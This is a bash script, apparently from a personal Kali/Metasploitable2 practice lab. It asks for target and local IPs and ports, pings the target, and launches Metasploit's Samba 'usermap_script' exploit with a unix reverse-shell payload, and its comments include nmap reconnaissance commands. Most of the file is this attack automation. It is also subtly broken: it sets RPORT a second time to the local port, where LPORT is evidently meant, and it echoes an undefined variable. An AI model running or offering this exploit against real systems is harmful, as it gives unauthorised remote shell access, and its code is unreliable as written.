#!/usr/bin/bash

#To run this script from the MacTerminal or iTerm2, ssh service on kali must be running
#ssh parallels@10.0.0.44
#cd /media/psf/Home/Documents/kali
#./{This.Script}.sh
#This scripts assumes Kali & Metasploitable2 are running
#In Kali Terminal strat the ssh service
# systemctl start ssh.socket
#Make sure Kali & Metasploitable are running before running bridge mode
#prlctl set "kali" --device-set net0 --type bridged

#Write code later to launch Kali and UTM if not running
#ps -A | grep kali
#ps -A | grep utm
#Testing deploying apps
#prompt user for input to launch an OS
#read -p "Enter the name of the platform or OSes you'd like to launch: " vm_name
#open -a /Applications/Parallels\ Desktop.app/ /Users/admin/Parallels/kali.pvm
#open -a /UTM/ Meta2

#Prompt the user for input
#read -p "Enter the VM name: " vm_name

: <<COMMENT
#Check if the VM name is provided
if [ -z "$vm_name" ]; then
    echo "Error: VM name cannot be empty."
    exit 1
fi

# Run the command with the provided VM name
prlctl set "$vm_name" --device-set net0 --type bridged

# Check the exit status of the previous command
if [ $? -eq 0 ]; then
    echo "Command executed successfully."
else
    echo "Error: Failed to execute the command."
fi
COMMENT

#Use NMAP to find vulnerabilites
#nmap -F 10.0.0.0/24  #find the ip for meta
#sudo nmap -sV -O 10.0.0.14 #run deep scan on meta to find open ports

#RemoteIP=10.0.0.14  #metasploit2
#RemotePortNum=445   #use samba 139 0r 445
#LocalIP=10.0.0.44   #kali box
#LocalPortNumNum=4444   #kali local port

read -p "Enter Target/Remote Host IP:  "	RemoteIP
read -p "Enter Target/Remote Host Port: "	RemotePortNum
read -p "Enter Source/Local Host IP:  "		LocalIP
read -p "Enter Source/Local Host Port: "	LocalPortNum

echo "Remote IP is: "	$RemoteIP
echo "Remote port is: " $RemotePortNum
echo "Local IP is: "	$LocalIP
echo "Local port is: "	$LocalPortNumNum

#Ping Metasploitable2 to make sure it's running before running the rest of this script
#ping -c 4 $IP 	#10.0.0.14

echo "Pinging $RemoteIP... if the server is online, the program proceeds, otherwise, it'll exit."
ping -c 1 $RemoteIP >/dev/null || { echo "The remote server is unavailable" ; exit; }
echo "If you see this message the server is up and this script will proceed!!"

#/usr/share/kali-menu/exec-in-shell "sudo msfdb init && msfconsole"
#Run this script in terminal, not in msfconsole.

msfconsole -q -x "use exploit/multi/samba/usermap_script;\
set RHOSTS $RemoteIP;\
set RPORT  $RemotePortNum;\
set LHOST  $LocalIP;\
set RPORT  $LocalPortNum;\
set PAYLOAD payload/cmd/unix/reverse;\
save;\
run"
